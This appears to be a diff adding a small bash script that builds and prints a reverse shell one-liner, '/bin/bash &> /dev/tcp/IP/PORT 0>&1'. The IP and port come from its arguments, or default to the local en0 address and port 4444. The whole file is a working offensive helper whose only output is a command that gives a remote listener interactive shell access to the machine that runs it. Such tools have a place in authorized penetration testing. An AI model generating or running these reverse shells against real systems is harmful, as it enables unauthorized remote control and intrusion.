@@ -1,0 +1,16 @@
+#!/bin/bash
+# Generate a bash-only reverse shell oneliner
+
+if [ "$#" == 1 ]; then
+    IP="$1"
+    PORT="4444"
+elif [ "$#" == 2 ]; then
+    IP="$1"
+    PORT="$2"
+else
+    # Default values
+    IP=$(ifconfig en0 | awk '/inet / { print $2 }')
+    PORT=4444
+fi
+
+echo "/bin/bash -c \"/bin/bash &> /dev/tcp/$IP/$PORT 0>&1\""
